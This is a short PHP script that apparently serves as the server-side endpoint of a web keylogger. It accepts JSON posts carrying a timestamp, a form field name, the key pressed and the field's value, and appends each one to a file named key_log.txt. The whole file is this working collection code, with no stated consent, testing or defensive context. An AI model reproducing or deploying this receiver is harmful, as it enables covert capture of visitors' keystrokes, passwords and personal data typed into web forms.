<?php
    $logfile = 'key_log.txt';

    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData,true);

    if($data) {
        $timestamp = isset($data['timestamp']) ? $data['timestamp'] : 'N/A';
        $inputField = isset($data['input_field']) ? $data['input_field'] : 'N/A';
        $keyPressed = isset($data['key_pressed']) ? $data['key_pressed'] : 'N/A';
        $value = isset($data['value']) ? $data['value'] : 'N/A';

        $logEntry = sprintf(
            "[%s] Field: %s, key: %s, Value: %s\n",
            $timestamp,
            $inputField,
            $keyPressed,
            $value
        );

        $writeResult = file_put_contents($logfile, $logEntry, FILE_APPEND);
    }
?>